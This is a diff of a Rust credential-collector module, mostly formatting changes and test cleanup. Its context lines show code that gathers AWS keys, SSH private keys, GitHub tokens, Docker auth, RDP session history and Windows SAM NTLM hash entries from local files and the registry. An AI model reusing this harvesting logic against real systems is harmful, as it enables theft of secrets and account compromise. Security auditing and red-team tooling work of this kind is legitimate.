@@ -43,7 +43,9 @@ impl CredentialCollector {
             if let Ok(paths) = glob::glob(pattern) {
                 for path in paths.filter_map(|p| p.ok()) {
                     if let Ok(content) = std::fs::read_to_string(&path) {
-                        if content.contains("aws_access_key_id") || content.contains("aws_secret_access_key") {
+                        if content.contains("aws_access_key_id")
+                            || content.contains("aws_secret_access_key")
+                        {
                             let display_content = self.extract_aws_credentials(&content);
                             tokens.push(Token {
                                 token_type: "AWS".to_string(),
@@ -75,7 +77,11 @@ impl CredentialCollector {
                 for path in paths.filter_map(|p| p.ok()) {
                     if let Ok(metadata) = std::fs::metadata(&path) {
                         if metadata.is_file() {
-                            let filename = path.file_name().unwrap_or_default().to_string_lossy().to_string();
+                            let filename = path
+                                .file_name()
+                                .unwrap_or_default()
+                                .to_string_lossy()
+                                .to_string();
                             if !filename.ends_with(".pub") {
                                 let fingerprint = self.compute_ssh_fingerprint(&path);
                                 keys.push(SshKey {
@@ -118,7 +124,9 @@ impl CredentialCollector {
                 for path in paths.filter_map(|p| p.ok()) {
                     if let Ok(content) = std::fs::read_to_string(&path) {
                         // 检测 GitHub token
-                        if content.contains("github") && (content.contains("oauth") || content.contains("token")) {
+                        if content.contains("github")
+                            && (content.contains("oauth") || content.contains("token"))
+                        {
                             let extracted = extract_token_value(&content, &["token", "oauth"]);
                             keys.push(ApiKey {
                                 service: "GitHub".to_string(),
@@ -302,12 +310,10 @@ impl CredentialCollector {
 
             let hkcu = RegKey::predef(HKEY_CURRENT_USER);
             let mut sessions = Vec::new();
-            if let Ok(servers_root) = hkcu
-                .open_subkey_with_flags(
-                    "Software\\Microsoft\\Terminal Server Client\\Servers",
-                    KEY_READ,
-                )
-            {
+            if let Ok(servers_root) = hkcu.open_subkey_with_flags(
+                "Software\\Microsoft\\Terminal Server Client\\Servers",
+                KEY_READ,
+            ) {
                 for host in servers_root.enum_keys().filter_map(|k| k.ok()) {
                     if let Ok(server) = servers_root.open_subkey_with_flags(&host, KEY_READ) {
                         let username: String = server.get_value("UsernameHint").unwrap_or_default();
@@ -459,7 +465,7 @@ impl CredentialCollector {
         let decoded = BASE64_STANDARD.decode(parts[1]).ok()?;
 
         // SHA-256 哈希
-        use sha2::{Sha256, Digest};
+        use sha2::{Digest, Sha256};
         let hash = Sha256::digest(&decoded);
 
         // 编码为 base64 并去掉末尾 '='
@@ -515,7 +521,10 @@ impl CredentialCollector {
                     if let Some((username, hash_str)) = parse_sam_v_value(&v_data.bytes) {
                         hashes.push(HashEntry {
                             hash_type: "NTLM".to_string(),
-                            location: format!("HKLM\\SAM\\SAM\\Domains\\Account\\Users\\{}", subkey_name),
+                            location: format!(
+                                "HKLM\\SAM\\SAM\\Domains\\Account\\Users\\{}",
+                                subkey_name
+                            ),
                             username,
                             hash: hash_str,
                         });
@@ -534,7 +543,10 @@ impl CredentialCollector {
                         let rid: u32 = name_key.get_value("").unwrap_or(0);
                         hashes.push(HashEntry {
                             hash_type: "NTLM".to_string(),
-                            location: format!("HKLM\\SAM\\SAM\\Domains\\Account\\Users\\{:08X}", rid),
+                            location: format!(
+                                "HKLM\\SAM\\SAM\\Domains\\Account\\Users\\{:08X}",
+                                rid
+                            ),
                             username: name,
                             hash: "[需要SYSTEM权限解密哈希]".to_string(),
                         });
@@ -565,14 +577,13 @@ fn extract_token_value(content: &str, keywords: &[&str]) -> Option<String> {
         for keyword in keywords {
             if line.contains(keyword) {
                 // 尝试多种分隔符
-                if let Some(value) = line.split('=').nth(1)
+                if let Some(value) = line
+                    .split('=')
+                    .nth(1)
                     .or_else(|| line.split(':').nth(1))
                     .or_else(|| line.split_whitespace().nth(1))
                 {
-                    let val = value.trim()
-                        .trim_matches('"')
-                        .trim_matches('\'')
-                        .trim();
+                    let val = value.trim().trim_matches('"').trim_matches('\'').trim();
                     if !val.is_empty() && val != "true" && val != "false" && val.len() > 3 {
                         return Some(val.to_string());
                     }
@@ -589,7 +600,10 @@ fn extract_aws_key_id(content: &str) -> Option<String> {
     for (i, _) in content.match_indices("AKIA") {
         if i + 20 <= content.len() {
             let key = &content[i..i + 20];
-            if key.chars().all(|c| c.is_ascii_uppercase() || c.is_ascii_digit()) {
+            if key
+                .chars()
+                .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit())
+            {
                 return Some(key.to_string());
             }
         }
@@ -603,10 +617,7 @@ fn extract_docker_auth(content: &str) -> Option<String> {
     for line in content.lines() {
         if line.contains("\"auth\"") {
             if let Some(value) = line.split(':').nth(1) {
-                let val = value.trim()
-                    .trim_matches('"')
-                    .trim_matches(',')
-                    .trim();
+                let val = value.trim().trim_matches('"').trim_matches(',').trim();
                 if !val.is_empty() && val != "{}" {
                     return Some(format!("auth={}", val));
                 }
@@ -654,7 +665,8 @@ fn parse_sam_v_value(v_data: &[u8]) -> Option<(String, String)> {
     if name_offset + name_length <= v_data.len() && name_length > 0 {
         let name_bytes = &v_data[name_offset..name_offset + name_length];
         let username = String::from_utf16(
-            &name_bytes.chunks(2)
+            &name_bytes
+                .chunks(2)
                 .map(|chunk| {
                     if chunk.len() == 2 {
                         u16::from_le_bytes([chunk[0], chunk[1]])
@@ -662,8 +674,9 @@ fn parse_sam_v_value(v_data: &[u8]) -> Option<(String, String)> {
                         0
                     }
                 })
-                .collect::<Vec<u16>>()
-        ).unwrap_or_else(|_| "[DECODE_ERROR]".to_string());
+                .collect::<Vec<u16>>(),
+        )
+        .unwrap_or_else(|_| "[DECODE_ERROR]".to_string());
 
         // NTLM 哈希在 V 值的固定位置（需要 SYSKEY 解密）
         // 这里仅标记需要解密
@@ -743,36 +756,31 @@ mod tests {
 
     #[test]
     fn test_credential_collector_creation() {
-        let collector = CredentialCollector::new();
-        assert!(true);
+        let _collector = CredentialCollector::new();
     }
 
     #[test]
     fn test_collect_password_hashes() {
         let collector = CredentialCollector::new();
         let _hashes = collector.collect_password_hashes();
-        assert!(true);
     }
 
     #[test]
     fn test_collect_tokens() {
         let collector = CredentialCollector::new();
         let _tokens = collector.collect_tokens();
-        assert!(true);
     }
 
     #[test]
     fn test_collect_ssh_keys() {
         let collector = CredentialCollector::new();
         let _keys = collector.collect_ssh_keys();
-        assert!(true);
     }
 
     #[test]
     fn test_collect_api_keys() {
         let collector = CredentialCollector::new();
         let _keys = collector.collect_api_keys();
-        assert!(true);
     }
 
     #[test]
